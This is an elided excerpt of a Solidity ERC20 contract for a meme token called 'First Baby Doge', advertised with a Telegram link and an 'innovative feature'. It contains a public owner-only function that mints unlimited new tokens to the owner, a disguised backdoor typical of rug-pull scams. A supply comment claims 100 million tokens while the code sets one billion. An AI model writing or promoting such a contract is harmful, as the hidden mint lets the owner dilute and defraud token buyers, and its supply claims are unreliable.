...
//
// $FirstBabyDoge proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/FirstBabyDoge
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Firstbabydoge(uint256 amount) public onlyOwner {
 _Firstbabydoge(msg.sender, amount);
    }
    ...
    function _Firstbabydoge(address account, uint256 amount) internal virtual {
...
contract $FirstBabyDoge is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("First Baby Doge", "FIRSTBABYDOGE") {
        _Firstbabydoge(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}